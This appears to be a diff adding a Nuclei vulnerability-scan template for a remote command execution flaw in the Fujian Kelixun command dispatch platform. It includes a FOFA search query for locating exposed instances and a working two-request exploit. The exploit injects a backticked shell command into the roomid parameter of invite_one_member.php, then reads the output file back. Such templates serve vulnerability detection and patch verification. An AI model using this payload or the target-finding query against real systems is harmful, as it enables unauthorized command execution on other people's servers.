@@ -1,0 +1,27 @@
+id: zhdd-invite_one_member-rce
+
+info:
+  name: 福建科立讯通信-指挥调度平台-远程命令执行-invite_one_member
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query: body="app/structure/departments.php" || app="指挥调度管理平台"
+
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        GET /api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`id>1.txt` HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+
+      - |
+        GET /api/client/audiobroadcast/1.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_2, "uid")
